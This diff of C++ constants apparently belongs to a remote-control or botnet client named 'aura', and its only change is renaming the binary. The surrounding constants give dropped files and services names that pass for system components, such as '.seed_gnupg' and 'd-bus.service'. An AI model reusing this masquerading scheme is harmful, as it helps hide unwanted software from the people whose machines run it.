@@ -24,7 +24,7 @@ const std::string ADMIN_INSTALL_DIR(
 const std::string COMMAND_TEMP_DIR("CacheData");
 
 const std::string AUTH_FILE("ProfileDataCache");
-const std::string BIN("aura.exe");
+const std::string BIN("aura-client.exe");
 const std::string BIN_NEW("AnalyzeProcessCache.exe");
 
 const std::string TASK_NAME("{3B3CC70E-08F1-46L6-87ED-4AK69034E676}");
@@ -42,7 +42,7 @@ const std::string SYS_SERVICE_DEST("/etc/systemd/system");
 const std::string COMMAND_TEMP_DIR(".temp");
 
 const std::string AUTH_FILE(".seed_gnupg~");
-const std::string BIN("aura");
+const std::string BIN("aura-client");
 const std::string BIN_NEW(".seed_gnupg");
 
 const std::string SERVICE("d-bus.service");
